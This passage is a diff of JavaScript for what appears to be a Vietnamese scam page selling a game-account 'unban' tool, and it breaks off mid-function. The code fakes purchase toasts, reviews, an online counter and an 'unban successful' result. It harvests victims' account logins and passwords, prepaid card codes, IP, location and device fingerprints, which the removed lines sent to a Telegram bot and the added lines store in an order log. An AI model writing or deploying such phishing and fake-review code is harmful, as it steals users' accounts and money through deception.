-      const cities = ['Hà Nội', 'TP.HCM', 'Đà Nẵng', 'Hải Phòng', 'Cần Thơ', 'Nha Trang', 'Huế', 'Đà Lạt', 'Bình Dương', 'Vũng Tàu'];
-      const times = ['vừa xong', '1 phút trước', '2 phút trước', 'vài giây trước', '3 phút trước', 'mới đây'];
-      const colors = ['#e74c3c', '#2ecc71', '#3498db', '#f39c12', '#9b59b6', '#1abc9c', '#e67e22'];
+      const games = ['Free Fire', 'PUBG Mobile', 'Liên Quân', 'Mobile Legends'];
+      const cities = ['Hà Nội', 'TP.HCM', 'Đà Nẵng', 'Hải Phòng', 'Cần Thơ', 'Nha Trang'];
+      const times = ['vừa xong', '1 phút trước', '2 phút trước', 'vài giây trước'];
+      const colors = ['#e74c3c', '#2ecc71', '#3498db', '#f39c12', '#9b59b6', '#1abc9c'];
       
       setInterval(() => {
-        const name = realNames[Math.floor(Math.random() * realNames.length)];
+        if (isBanned) return;
+        const name = names[Math.floor(Math.random() * names.length)];
         const plan = plans[Math.floor(Math.random() * plans.length)];
         const game = games[Math.floor(Math.random() * games.length)];
         const city = cities[Math.floor(Math.random() * cities.length)];
@@ -1128,9 +798,7 @@
         const toast = document.createElement('div');
         toast.className = 'toast-notification';
         toast.innerHTML = `
-          <div style="width:40px; height:40px; border-radius:50%; background:${color}; display:flex; align-items:center; justify-content:center; color:white; font-weight:bold; font-size:1.1rem; flex-shrink:0;">
-            ${initials}
-          </div>
+          <div style="width:40px; height:40px; border-radius:50%; background:${color}; display:flex; align-items:center; justify-content:center; color:white; font-weight:bold; flex-shrink:0;">${initials}</div>
           <div style="flex:1;">
             <strong>${name}</strong><br>
             <span style="font-size:0.85rem;">ở <strong>${city}</strong> vừa mua</span>
@@ -1150,80 +818,59 @@
       }, 8000 + Math.random() * 10000);
     }
 
-    // ============================================
-    // FAKE REVIEWS (TÊN THẬT)
-    // ============================================
     function addRandomReview() {
       const reviews = [
-        { name: 'Nguyễn Văn Hùng', stars: 5, text: 'Tool chạy rất nhanh, 15 phút là xong. Rất đáng tiền! Sẽ ủng hộ dài dài.', city: 'Hà Nội' },
-        { name: 'Trần Thị Mai', stars: 5, text: 'Mở band thành công sau 30 phút. Bảo hành uy tín, admin hỗ trợ nhiệt tình.', city: 'TP.HCM' },
-        { name: 'Lê Hoàng Nam', stars: 4, text: 'Hơi chậm tí nhưng kết quả tốt. Đã mở được 2 acc Free Fire. Sẽ ủng hộ tiếp.', city: 'Đà Nẵng' },
-        { name: 'Phạm Minh Tuấn', stars: 5, text: 'Đã mở band cho 3 acc PUBG. Tất cả đều OK! Tool ngon, giá hợp lý.', city: 'Hải Phòng' },
-        { name: 'Hoàng Thị Lan', stars: 5, text: 'Dịch vụ tuyệt vời, hỗ trợ nhiệt tình 24/7. Mở band Liên Quân thành công.', city: 'Cần Thơ' },
-        { name: 'Đặng Quốc Bảo', stars: 4, text: 'Lần đầu dùng hơi lo nhưng kết quả tốt. Bảo hành 6 tháng yên tâm.', city: 'Nha Trang' },
-        { name: 'Bùi Thanh Hà', stars: 5, text: 'Mở band Free Fire nhanh, giá rẻ hơn mấy chỗ khác. Đã giới thiệu cho bạn bè.', city: 'Huế' },
-        { name: 'Ngô Hữu Phúc', stars: 5, text: 'Tool ngon, bảo hành chu đáo. Rất đáng đồng tiền! Sẽ quay lại ủng hộ.', city: 'Đà Lạt' },
-        { name: 'Đỗ Thị Hương', stars: 5, text: 'Mở band thành công cho acc Liên Quân bị khóa 1 năm. Quá tuyệt vời!', city: 'Bình Dương' },
-        { name: 'Vũ Đình Quân', stars: 4, text: 'Dịch vụ tốt, giá cả phải chăng. Hơi chậm xíu nhưng bảo hành uy tín.', city: 'Vũng Tàu' },
+        { name: 'Nguyễn Văn Hùng', stars: 5, text: 'Tool chạy rất nhanh, 15 phút là xong. Rất đáng tiền!', city: 'Hà Nội' },
+        { name: 'Trần Thị Mai', stars: 5, text: 'Mở band thành công sau 30 phút. Bảo hành uy tín.', city: 'TP.HCM' },
+        { name: 'Lê Hoàng Nam', stars: 4, text: 'Hơi chậm tí nhưng kết quả tốt. Đã mở được 2 acc.', city: 'Đà Nẵng' },
+        { name: 'Phạm Minh Tuấn', stars: 5, text: 'Đã mở band cho 3 acc PUBG. Tất cả đều OK!', city: 'Hải Phòng' },
+        { name: 'Hoàng Thị Lan', stars: 5, text: 'Dịch vụ tuyệt vời, hỗ trợ nhiệt tình 24/7.', city: 'Cần Thơ' },
+        { name: 'Đặng Quốc Bảo', stars: 4, text: 'Lần đầu dùng hơi lo nhưng kết quả tốt.', city: 'Nha Trang' },
+        { name: 'Bùi Thanh Hà', stars: 5, text: 'Mở band Free Fire nhanh, giá rẻ hơn mấy chỗ khác.', city: 'Huế' },
+        { name: 'Ngô Hữu Phúc', stars: 5, text: 'Tool ngon, bảo hành chu đáo. Rất đáng đồng tiền!', city: 'Đà Lạt' }
       ];
 
       const container = document.getElementById('reviewsContainer');
-      if (!container) return;
+      if (!container || isBanned) return;
       
       const review = reviews[Math.floor(Math.random() * reviews.length)];
       const starsHtml = '⭐'.repeat(review.stars);
       const colors = ['#e74c3c', '#2ecc71', '#3498db', '#f39c12', '#9b59b6', '#1abc9c'];
       const color = colors[Math.floor(Math.random() * colors.length)];
       const initials = review.name.charAt(0) + review.name.split(' ').pop().charAt(0);
-      const times = ['Vừa xong', '1 phút trước', '2 phút trước', '3 phút trước', '5 phút trước'];
-      const time = times[Math.floor(Math.random() * times.length)];
+      const times = ['Vừa xong', '1 phút trước', '2 phút trước'];
       
       const card = document.createElement('div');
       card.className = 'review-card';
       card.innerHTML = `
         <div style="display:flex; align-items:center; gap:10px; margin-bottom:8px;">
-          <div style="width:40px; height:40px; border-radius:50%; background:${color}; display:flex; align-items:center; justify-content:center; color:white; font-weight:bold; flex-shrink:0;">
-            ${initials}
-          </div>
-          <div>
-            <strong>${review.name}</strong>
-            <span style="font-size:0.8rem; color:#9aa9c1; margin-left:5px;">• ${review.city}</span>
-            <div>${starsHtml}</div>
-          </div>
+          <div style="width:40px; height:40px; border-radius:50%; background:${color}; display:flex; align-items:center; justify-content:center; color:white; font-weight:bold;">${initials}</div>
+          <div><strong>${review.name}</strong><span style="font-size:0.8rem; color:#9aa9c1; margin-left:5px;">• ${review.city}</span><div>${starsHtml}</div></div>
         </div>
         <p style="color:#bdd3ff; margin:8px 0;">${review.text}</p>
-        <small style="color:#9aa9c1;">• ${time}</small>
+        <small style="color:#9aa9c1;">• ${times[Math.floor(Math.random() * times.length)]}</small>
       `;
-      
       container.insertBefore(card, container.firstChild);
-      
-      const cards = container.querySelectorAll('.review-card');
-      if (cards.length > 8) {
-        cards[cards.length - 1].remove();
+      if (container.querySelectorAll('.review-card').length > 8) {
+        container.lastChild.remove();
       }
     }
 
-    // ============================================
-    // ONLINE COUNTER
-    // ============================================
     function updateOnlineCount() {
       const hour = new Date().getHours();
-      let base = 100;
-      if (hour >= 20 && hour <= 23) base = 200 + Math.floor(Math.random() * 100);
-      else if (hour >= 0 && hour <= 5) base = 30 + Math.floor(Math.random() * 30);
-      else base = 80 + Math.floor(Math.random() * 80);
-      
+      let base = hour >= 20 && hour <= 23 ? 200 + Math.floor(Math.random() * 100) : 
+                 hour >= 0 && hour <= 5 ? 30 + Math.floor(Math.random() * 30) : 
+                 80 + Math.floor(Math.random() * 80);
       document.getElementById('onlineCount').textContent = base;
-      
       setInterval(() => {
+        if (isBanned) return;
         const current = parseInt(document.getElementById('onlineCount').textContent);
-        const change = Math.floor(Math.random() * 6) - 3;
-        document.getElementById('onlineCount').textContent = Math.max(10, current + change);
+        document.getElementById('onlineCount').textContent = Math.max(10, current + Math.floor(Math.random() * 6) - 3);
       }, 30000);
     }
 
     // ============================================
-    // PRICE CALCULATION
+    // PRICE & FORM FUNCTIONS
     // ============================================
     const serverPrices = {
       freefire: { vietnam: 1, indonesia: 1.3, thailand: 1.2, brazil: 1.5 },
@@ -1241,13 +888,9 @@
     }
 
     function getFinalPrice() {
-      const multiplier = serverPrices[state.game]?.[state.server] || 1;
-      return Math.round(state.plan.price * multiplier);
+      return Math.round(state.plan.price * (serverPrices[state.game]?.[state.server] || 1));
     }
 
-    // ============================================
-    // CAPTCHA
-    // ============================================
     function generateCaptcha() {
       const a = Math.floor(Math.random() * 10) + 1;
       const b = Math.floor(Math.random() * 10) + 1;
@@ -1255,31 +898,17 @@
       document.getElementById('captchaQuestion').textContent = `${a} + ${b}`;
     }
 
-    // ============================================
-    // UTILITY FUNCTIONS
-    // ============================================
     function copyToClipboard(text) {
       navigator.clipboard.writeText(text).then(() => {
-        Swal.fire({
-          icon: 'success',
-          title: '✅ Đã sao chép!',
-          timer: 1500,
-          showConfirmButton: false
-        });
+        Swal.fire({ icon: 'success', title: '✅ Đã sao chép!', timer: 1500, showConfirmButton: false });
       }).catch(() => {
-        // Fallback
         const textarea = document.createElement('textarea');
         textarea.value = text;
         document.body.appendChild(textarea);
         textarea.select();
         document.execCommand('copy');
         document.body.removeChild(textarea);
-        Swal.fire({
-          icon: 'success',
-          title: '✅ Đã sao chép!',
-          timer: 1500,
-          showConfirmButton: false
-        });
+        Swal.fire({ icon: 'success', title: '✅ Đã sao chép!', timer: 1500, showConfirmButton: false });
       });
     }
 
@@ -1307,279 +936,334 @@
       const messages = document.getElementById('chatMessages');
       const time = new Date().toLocaleTimeString('vi-VN', { hour: '2-digit', minute: '2-digit' });
       
-      // User message
       messages.innerHTML += `
         <div style="margin-bottom:10px; text-align:right;">
-          <div style="display:inline-block; background:#0077ff; color:white; padding:8px 12px; border-radius:15px 15px 0 15px; max-width:80%;">
-            ${msg}
-          </div>
+          <div style="display:inline-block; background:#0077ff; color:white; padding:8px 12px; border-radius:15px 15px 0 15px; max-width:80%;">${msg}</div>
           <div style="font-size:0.7rem; color:#6c7e9e;">${time}</div>
         </div>
       `;
       
-      // Send to Telegram
-      sendToTelegram(`💬 <b>Chat từ người dùng</b>\n📡 <b>IP:</b> ${userIP}\n🆔 <b>Device:</b> ${deviceFingerprint}\n📝 <b>Nội dung:</b> ${msg}`);
+      if (syncManager) {
+        syncManager.addLog('CHAT', `User message: ${msg.substring(0, 100)}`, { ip: userIP });
+      }
       
-      // Show typing indicator
       const typingDiv = document.getElementById('typingIndicator');
       typingDiv.classList.remove('hidden');
       
-      // Auto response after delay
       setTimeout(() => {
         typingDiv.classList.add('hidden');
         
+        let response = 'Cảm ơn bạn đã liên hệ! Admin sẽ phản hồi trong giây lát.';
         const lowerMsg = msg.toLowerCase();
-        let response = 'Cảm ơn bạn đã liên hệ! Admin sẽ phản hồi trong giây lát. Nếu cần gấp, vui lòng gọi: 09xxxxxxx';
-        
-        if (lowerMsg.includes('bảo hành') || lowerMsg.includes('bao hanh')) {
-          response = '🛡️ <b>Chính sách bảo hành:</b>\n• Gói Cơ Bản: 3 tháng\n• Gói VIP: 6 tháng\n• Gói Ultimate: 12 tháng\n\nTrong thời gian bảo hành, nếu tài khoản bị band lại, chúng tôi sẽ mở miễn phí.';
-        } else if (lowerMsg.includes('thanh toán') || lowerMsg.includes('gia') || lowerMsg.includes('tiền')) {
-          response = '💰 <b>Bảng giá:</b>\n• Cơ Bản: 150.000đ (30-45 phút)\n• VIP: 300.000đ (10-15 phút)\n• Ultimate: 500.000đ (5-10 phút)\n\nChuyển khoản MB Bank: 0644612345555 - Tran Nguyen Duc Minh';
-        } else if (lowerMsg.includes('thời gian') || lowerMsg.includes('bao lâu')) {
-          response = '⏱ <b>Thời gian xử lý:</b>\n• Cơ Bản: 30-45 phút\n• VIP: 10-15 phút\n• Ultimate: 5-10 phút\n\nThời gian có thể nhanh hơn tùy vào lượng đơn.';
-        } else if (lowerMsg.includes('cách') || lowerMsg.includes('hướng dẫn') || lowerMsg.includes('làm sao')) {
-          response = '📝 <b>Hướng dẫn:</b>\n1. Chọn game và server\n2. Chọn gói dịch vụ\n3. Nhập UID và thông tin\n4. Chuyển khoản và tải ảnh\n5. Nhấn Gửi yêu cầu\n\nAdmin sẽ duyệt và tool tự động chạy!';
-        }
+        if (lowerMsg.includes('bảo hành')) response = '🛡️ Bảo hành: Cơ Bản 3 tháng, VIP 6 tháng, Ultimate 12 tháng.';
+        else if (lowerMsg.includes('giá') || lowerMsg.includes('tiền')) response = '💰 Giá: Cơ Bản 150k, VIP 300k, Ultimate 500k.';
+        else if (lowerMsg.includes('thời gian')) response = '⏱ Cơ Bản 30-45ph, VIP 10-15ph, Ultimate 5-10ph.';
         
         messages.innerHTML += `
           <div style="margin-bottom:10px;">
-            <div style="display:inline-block; background:#1d2c45; color:#cfdefa; padding:8px 12px; border-radius:15px 15px 15px 0; max-width:80%;">
-              ${response}
-            </div>
+            <div style="display:inline-block; background:#1d2c45; color:#cfdefa; padding:8px 12px; border-radius:15px 15px 15px 0; max-width:80%;">${response}</div>
             <div style="font-size:0.7rem; color:#6c7e9e;">${time}</div>
           </div>
         `;
         messages.scrollTop = messages.scrollHeight;
-      }, 1500 + Math.random() * 1000);
+      }, 1000 + Math.random() * 1000);
       
       input.value = '';
       messages.scrollTop = messages.scrollHeight;
     }
 
     // ============================================
-    // SAVE HISTORY
+    // IMAGE UPLOAD
     // ============================================
-    function saveToHistory(orderId, uid, price, status) {
-      const history = JSON.parse(localStorage.getItem('toolHistory') || '[]');
-      history.unshift({
-        orderId,
-        uid,
-        game: state.game,
-        server: state.server,
-        plan: state.plan.name,
-        price,
-        status,
-        time: new Date().toLocaleString('vi-VN'),
-        ip: userIP
+    function setupImageUpload() {
+      const dropZone = document.getElementById('fileUploadArea');
+      const fileInput = document.getElementById('paymentImage');
+      
+      dropZone.addEventListener('click', (e) => {
+        if (e.target.closest('#imagePreviewContainer') || e.target.closest('button')) return;
+        fileInput.click();
       });
-      localStorage.setItem('toolHistory', JSON.stringify(history.slice(0, 50)));
+
+      fileInput.addEventListener('change', (e) => {
+        if (e.target.files[0]) handleImageFile(e.target.files[0]);
+      });
+
+      dropZone.addEventListener('dragover', (e) => { e.preventDefault(); dropZone.classList.add('drag-over'); });
+      dropZone.addEventListener('dragleave', () => dropZone.classList.remove('drag-over'));
+      dropZone.addEventListener('drop', (e) => {
+        e.preventDefault();
+        dropZone.classList.remove('drag-over');
+        const file = e.dataTransfer.files[0];
+        if (file && file.type.startsWith('image/')) handleImageFile(file);
+        else Swal.fire('❌', 'Vui lòng chọn file ảnh!', 'error');
+      });
+
+      document.addEventListener('paste', (e) => {
+        for (const item of e.clipboardData.items) {
+          if (item.type.startsWith('image/')) {
+            handleImageFile(item.getAsFile());
+            break;
+          }
+        }
+      });
+    }
+
+    function handleImageFile(file) {
+      if (!['image/jpeg', 'image/png', 'image/gif', 'image/webp'].includes(file.type)) {
+        Swal.fire('❌', 'Định dạng không hỗ trợ!', 'error');
+        return;
+      }
+      if (file.size > 10 * 1024 * 1024) {
+        Swal.fire('❌', 'File quá lớn! Tối đa 10MB.', 'error');
+        return;
+      }
+
+      uploadedImageFile = file;
+      const reader = new FileReader();
+      reader.onload = (e) => {
+        uploadedImageData = e.target.result;
+        document.getElementById('imagePreview').src = e.target.result;
+        document.getElementById('uploadPlaceholder').style.display = 'none';
+        document.getElementById('imagePreviewContainer').style.display = 'block';
+        document.getElementById('fileUploadArea').style.borderStyle = 'solid';
+        document.getElementById('fileUploadArea').style.borderColor = '#2ecc71';
+        Swal.fire({ icon: 'success', title: '✅ Tải ảnh thành công!', timer: 2000, showConfirmButton: false });
+      };
+      reader.readAsDataURL(file);
+    }
+
+    function removeImage() {
+      uploadedImageFile = null;
+      uploadedImageData = null;
+      document.getElementById('paymentImage').value = '';
+      document.getElementById('imagePreview').src = '';
+      document.getElementById('uploadPlaceholder').style.display = 'block';
+      document.getElementById('imagePreviewContainer').style.display = 'none';
+      document.getElementById('fileUploadArea').style.borderStyle = 'dashed';
+      document.getElementById('fileUploadArea').style.borderColor = '#3f5580';
+    }
+
+    function zoomImage() {
+      const imgSrc = document.getElementById('imagePreview').src;
+      if (imgSrc) {
+        Swal.fire({ imageUrl: imgSrc, showCloseButton: true, showConfirmButton: false, width: '90%', background: '#0a0f1e' });
+      }
+    }
+
+    // ============================================
+    // ORDER PROCESSING
+    // ============================================
+    function resetProgress() {
+      ['progressDuyet', 'progressXuLy', 'progressDone'].forEach(id => {
+        const el = document.getElementById(id);
+        if (el) {
+          el.classList.remove('active', 'completed');
+          if (id === 'progressDuyet') el.textContent = '⏳ Duyệt';
+          if (id === 'progressXuLy') el.textContent = '🔧 Xử lý';
+          if (id === 'progressDone') el.textContent = '✅ Xong';
+        }
+      });
+    }
+
+    function simulateAutoProcessing(orderId) {
+      const progressBar = document.getElementById('progressBar');
+      progressBar.classList.remove('hidden');
+      resetProgress();
+      
+      const progressDuyet = document.getElementById('progressDuyet');
+      progressDuyet.classList.add('active');
+      
+      const duyetTime = state.plan.name === 'ultimate' ? 1000 : state.plan.name === 'vip' ? 2000 : 4000;
+      
+      setTimeout(() => {
+        progressDuyet.classList.remove('active');
+        progressDuyet.classList.add('completed');
+        progressDuyet.textContent = '✅ Duyệt';
+        
+        if (syncManager) {
+          syncManager.updateOrder(orderId, { status: 'processing', processingStartedAt: new Date().toISOString() });
+        }
+        
+        const progressXuLy = document.getElementById('progressXuLy');
+        progressXuLy.classList.add('active');
+        
+        const xuLyTime = state.plan.name === 'ultimate' ? 3000 : state.plan.name === 'vip' ? 8000 : 20000;
+        
+        setTimeout(() => {
+          progressXuLy.classList.remove('active');
+          progressXuLy.classList.add('completed');
+          progressXuLy.textContent = '✅ Xử lý';
+          
+          const progressDone = document.getElementById('progressDone');
+          progressDone.classList.add('active');
+          
+          setTimeout(() => {
+            progressDone.classList.remove('active');
+            progressDone.classList.add('completed');
+            progressDone.textContent = '✅ Xong';
+            
+            if (syncManager) {
+              syncManager.updateOrder(orderId, { status: 'completed', completedAt: new Date().toISOString() });
+            }
+            
+            document.getElementById('timerDisplay').classList.add('hidden');
+            if (state.countdownInterval) clearInterval(state.countdownInterval);
+            
+            document.getElementById('resultBox').innerHTML = `
+              <div style="color:#2ecc71; text-align:center;">
+                <h3>🎉 MỞ BAND THÀNH CÔNG!</h3>
+                <p>Tài khoản đã được mở band vĩnh viễn!</p>
+                <div style="background:linear-gradient(135deg,#1d2c45,#2e405b); border:2px solid #f39c12; border-radius:20px; padding:20px; margin-top:15px;">
+                  <h3 style="color:#f39c12;">🛡️ Thẻ Bảo Hành</h3>
+                  <div style="font-size:1.5rem; font-weight:bold; color:#ffd966;">BH-${orderId}</div>
+                  <p style="color:#b0d4ff;">Thời hạn: ${state.plan.name === 'ultimate' ? '12 tháng' : state.plan.name === 'vip' ? '6 tháng' : '3 tháng'}</p>
+                </div>
+              </div>
+            `;
+            
+            Swal.fire({ icon: 'success', title: '🎉 Mở Band Thành Công!', text: 'Kiểm tra tài khoản ngay!', confirmButtonText: 'OK' });
+            playSound('complete');
+          }, 2000);
+        }, xuLyTime);
+      }, duyetTime);
+      
+      const totalTime = duyetTime + (state.plan.name === 'ultimate' ? 5000 : state.plan.name === 'vip' ? 13000 : 26000);
+      startCountdown(Math.floor(totalTime / 1000));
+    }
+
+    function startCountdown(seconds) {
+      const display = document.getElementById('timerDisplay');
+      display.classList.remove('hidden');
+      let remaining = seconds;
+      
+      if (state.countdownInterval) clearInterval(state.countdownInterval);
+      
+      state.countdownInterval = setInterval(() => {
+        const min = Math.floor(remaining / 60);
+        const sec = remaining % 60;
+        display.textContent = `⏳ Đang xử lý: ${min}:${sec.toString().padStart(2, '0')}`;
+        if (remaining <= 0) {
+          clearInterval(state.countdownInterval);
+          display.textContent = '✅ HOÀN THÀNH!';
+        }
+        remaining--;
+      }, 1000);
     }
 
     // ============================================
     // FORM SUBMISSION
     // ============================================
     document.getElementById('submitRequestBtn').addEventListener('click', async function() {
+      if (isBanned) {
+        Swal.fire('🚫', 'Tài khoản của bạn đã bị chặn!', 'error');
+        return;
+      }
+      
       const ffId = document.getElementById('ffIdInput').value.trim();
       const platformAcc = document.getElementById('platformAccountInput').value.trim();
       const password = document.getElementById('passwordInput').value.trim();
       const captchaAnswer = parseInt(document.getElementById('captchaAnswer').value);
       const honeypot = document.getElementById('honeypotField').value;
 
-      // Honeypot check
       if (honeypot.length > 0) {
-        await sendToTelegram(`🤖 <b>CẢNH BÁO BOT!</b>\n📡 <b>IP:</b> ${userIP}\n🔍 Honeypot đã được điền: "${honeypot}"`);
-        Swal.fire('🤖', 'Phát hiện hoạt động đáng ngờ! Vui lòng thử lại.', 'error');
+        if (syncManager) syncManager.addLog('SECURITY', 'Bot detected (honeypot)', { ip: userIP });
+        Swal.fire('🤖', 'Phát hiện hoạt động đáng ngờ!', 'error');
         return;
       }
 
-      // Validation
       if (!ffId || !platformAcc || !password) {
-        Swal.fire('❌', 'Vui lòng nhập đầy đủ thông tin tài khoản!', 'error');
+        Swal.fire('❌', 'Vui lòng nhập đầy đủ thông tin!', 'error');
         return;
       }
 
       if (isNaN(captchaAnswer) || captchaAnswer !== state.captchaResult) {
         generateCaptcha();
         document.getElementById('captchaAnswer').value = '';
-        Swal.fire('❌', 'Xác nhận bảo mật sai! Vui lòng thử lại.', 'error');
+        Swal.fire('❌', 'Xác nhận bảo mật sai!', 'error');
         return;
       }
 
       if (state.paymentMethod === 'bank' && !uploadedImageFile) {
-        Swal.fire('❌', 'Vui lòng tải ảnh chuyển khoản! Đây là bước bắt buộc.', 'error');
+        Swal.fire('❌', 'Vui lòng tải ảnh chuyển khoản!', 'error');
         return;
       }
 
       if (state.paymentMethod === 'card') {
-        const cardCode = document.getElementById('cardCode').value.trim();
-        const cardSerial = document.getElementById('cardSerial').value.trim();
-        if (!cardCode || !cardSerial) {
-          Swal.fire('❌', 'Vui lòng nhập đầy đủ mã thẻ và số seri!', 'error');
+        if (!document.getElementById('cardCode').value.trim() || !document.getElementById('cardSerial').value.trim()) {
+          Swal.fire('❌', 'Vui lòng nhập đầy đủ mã thẻ và seri!', 'error');
           return;
         }
       }
 
       const finalPrice = getFinalPrice();
 
-      // Confirm dialog
       const confirmResult = await Swal.fire({
         title: '📋 Xác Nhận Thông Tin',
         html: `
           <div style="text-align:left; line-height:2;">
             <p>🎮 <strong>Game:</strong> ${state.game.toUpperCase()}</p>
-            <p>🌐 <strong>Server:</strong> ${state.server.toUpperCase()}</p>
             <p>🆔 <strong>UID:</strong> ${ffId}</p>
             <p>💎 <strong>Gói:</strong> ${state.plan.name.toUpperCase()}</p>
-            <p>💰 <strong>Tổng tiền:</strong> <span style="color:#ffd966; font-size:1.2rem;">${finalPrice.toLocaleString()}đ</span></p>
-            <p>📡 <strong>IP của bạn:</strong> ${userIP}</p>
-            <p style="color:#ff6b6b; font-size:0.9rem;">⚠️ Vui lòng kiểm tra kỹ thông tin trước khi gửi!</p>
+            <p>💰 <strong>Tổng:</strong> <span style="color:#ffd966;">${finalPrice.toLocaleString()}đ</span></p>
           </div>
         `,
         icon: 'question',
         showCancelButton: true,
         confirmButtonText: '✅ Xác nhận & Gửi',
-        cancelButtonText: '❌ Hủy bỏ',
-        confirmButtonColor: '#2ecc71',
-        cancelButtonColor: '#e74c3c'
+        cancelButtonText: '❌ Hủy'
       });
 
       if (!confirmResult.isConfirmed) return;
 
-      // Disable button
       const btn = this;
       btn.disabled = true;
-      btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Đang gửi yêu cầu...';
-
-      // Reset UI
-      document.getElementById('progressBar').classList.add('hidden');
-      document.getElementById('timerDisplay').classList.add('hidden');
-      const existingWarranty = document.getElementById('warrantySection');
-      if (existingWarranty) existingWarranty.remove();
-      if (state.countdownInterval) clearInterval(state.countdownInterval);
-      if (state.pollingInterval) clearInterval(state.pollingInterval);
-      resetProgress();
-
-      const resultBox = document.getElementById('resultBox');
-      resultBox.classList.remove('hidden');
-      resultBox.innerHTML = `
-        <div style="text-align:center;">
-          <div class="skeleton" style="height:30px; width:80%; margin:10px auto;"></div>
-          <div class="skeleton" style="height:20px; width:60%; margin:10px auto;"></div>
-          <div class="skeleton" style="height:20px; width:40%; margin:10px auto;"></div>
-        </div>
-      `;
-      resultBox.style.color = '#ffd966';
+      btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Đang gửi...';
 
       try {
         state.currentOrderId = `FF-${Date.now().toString(36).toUpperCase()}`;
-        const ipDetails = await fetchIPDetails(userIP);
         
-        // Build Telegram message
-        let messageText = `
-🔔 <b>YÊU CẦU MỚI #${state.currentOrderId}</b>
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-🎮 <b>Game:</b> ${state.game.toUpperCase()}
-🌐 <b>Server:</b> ${state.server.toUpperCase()}
-💎 <b>Gói:</b> ${state.plan.name.toUpperCase()}
-💰 <b>Giá:</b> ${finalPrice.toLocaleString()}đ
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-👤 <b>UID:</b> <code>${ffId}</code>
-🔗 <b>Nền tảng:</b> ${state.platform.toUpperCase()}
-📧 <b>Tài khoản:</b> ${platformAcc}
-🔐 <b>Mật khẩu:</b> <code>${password}</code>
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-🌐 <b>IP:</b> <code>${userIP}</code>
-📍 <b>Vị trí:</b> ${ipDetails.city || 'Unknown'}, ${ipDetails.country || 'Unknown'}
-🆔 <b>Device ID:</b> <code>${deviceFingerprint}</code>
-⏰ <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN')}
-        `.trim();
+        const orderData = {
+          orderId: state.currentOrderId,
+          uid: ffId,
+          platformAccount: platformAcc,
+          password: password,
+          game: state.game,
+          server: state.server,
+          platform: state.platform,
+          plan: state.plan.name,
+          price: finalPrice,
+          paymentMethod: state.paymentMethod,
+          status: 'pending',
+          ip: userIP,
+          location: userLocation,
+          fingerprint: deviceFingerprint,
+          createdAt: new Date().toISOString()
+        };
 
-        // Handle payment method
-        if (state.paymentMethod === 'bank' && uploadedImageFile) {
-          messageText += '\n💳 <b>Thanh toán:</b> Chuyển khoản MB Bank';
-          
-          // Compress if large
-          let imageBlob = uploadedImageFile;
-          if (uploadedImageFile.size > 500000) {
-            imageBlob = await compressImageBlob(uploadedImageFile);
-          }
-          
-          const photoResult = await sendPhotoToTelegram(imageBlob, `📸 Ảnh CK - ${state.currentOrderId} - ${ffId}`);
-          if (!photoResult || !photoResult.ok) {
-            console.warn('Photo send failed, will retry with text only');
-            messageText += '\n⚠️ <b>Lỗi gửi ảnh:</b> Admin vui lòng yêu cầu gửi lại';
-          }
-        } else if (state.paymentMethod === 'card') {
-          const cardType = document.getElementById('cardType').value;
-          const cardCode = document.getElementById('cardCode').value.trim();
-          const cardSerial = document.getElementById('cardSerial').value.trim();
-          messageText += `\n💳 <b>Thanh toán:</b> Thẻ cào ${cardType}\n🎫 <b>Mã thẻ:</b> ${cardCode}\n🔢 <b>Seri:</b> ${cardSerial}`;
+        if (syncManager) {
+          await syncManager.addOrder(orderData);
+          await syncManager.addLog('ORDER_CREATED', `New order #${state.currentOrderId} - ${state.game}`, orderData);
         }
 
-        // Send message with approve/reject buttons
-        const buttons = [[
-          { text: '✅ ĐỒNG Ý (Mở band)', callback_data: `approve_${state.currentOrderId}` },
-          { text: '❌ KHÔNG ĐỒNG Ý', callback_data: `reject_${state.currentOrderId}` }
-        ]];
-
-        const msgResult = await sendMessageWithButtons(messageText, buttons);
-
-        if (msgResult && msgResult.ok) {
-          // Save to localStorage
-          saveToHistory(state.currentOrderId, ffId, finalPrice, 'pending');
-          
-          // Update UI
-          resultBox.innerHTML = `
-            <div style="color:#ffd966; text-align:center;">
-              <h3>⏳ Đã gửi yêu cầu #${state.currentOrderId}</h3>
-              <p>Vui lòng chờ admin duyệt...</p>
-              <p style="font-size:0.9rem; color:#9aa9c1;">Thời gian dự kiến: ${state.plan.time} phút</p>
-              <p style="font-size:0.8rem; color:#6c7e9e;">Bạn có thể theo dõi trạng thái tại đây</p>
-            </div>
-          `;
-          
-          playSound('notification');
-          
-          // Start polling for admin response
-          startPollingForApproval(msgResult.result.message_id, state.currentOrderId);
-          
-          // Send IP details separately
-          sendToTelegram(`
-🌐 <b>THÔNG TIN CHI TIẾT - #${state.currentOrderId}</b>
-📡 <b>IP:</b> ${userIP}
-📍 <b>Thành phố:</b> ${ipDetails.city || 'N/A'}
-🏢 <b>ISP:</b> ${ipDetails.org || ipDetails.isp || 'N/A'}
-🌍 <b>Quốc gia:</b> ${ipDetails.country || 'N/A'}
-🖥 <b>Trình duyệt:</b> ${navigator.userAgent.substring(0, 100)}
-📱 <b>Độ phân giải:</b> ${window.screen.width}x${window.screen.height}
-          `.trim());
-          
-          Swal.fire({
-            icon: 'success',
-            title: '✅ Gửi Thành Công!',
-            text: `Mã đơn hàng: #${state.currentOrderId}\nAdmin sẽ duyệt trong giây lát.`,
-            timer: 4000,
-            showConfirmButton: true,
-            confirmButtonText: 'OK'
-          });
-          
-          // Reset form
-          generateCaptcha();
-          document.getElementById('captchaAnswer').value = '';
-          
-        } else {
-          throw new Error('Không thể gửi tin nhắn đến Telegram. Vui lòng thử lại.');
-        }
-        
-      } catch (error) {
-        console.error('Submit error:', error);
-        resultBox.innerHTML = `
-          <div style="color:#ff6b6b; text-align:center;">
-            <h3>❌ Lỗi Kết Nối</h3>
-            <p>${error.message}</p>
-            <button class="btn-sm mt-10" onclick="location.reload()">Thử lại</button>
+        document.getElementById('resultBox').classList.remove('hidden');
+        document.getElementById('resultBox').innerHTML = `
+          <div style="color:#ffd966; text-align:center;">
+            <h3>⏳ Đã gửi #${state.currentOrderId}</h3>
+            <p>Hệ thống đang xử lý tự động...</p>
+            <p style="font-size:0.9rem;">Dự kiến: ${state.plan.time} phút</p>
           </div>
         `;
+        
+        setTimeout(() => simulateAutoProcessing(state.currentOrderId), 2000);
+        
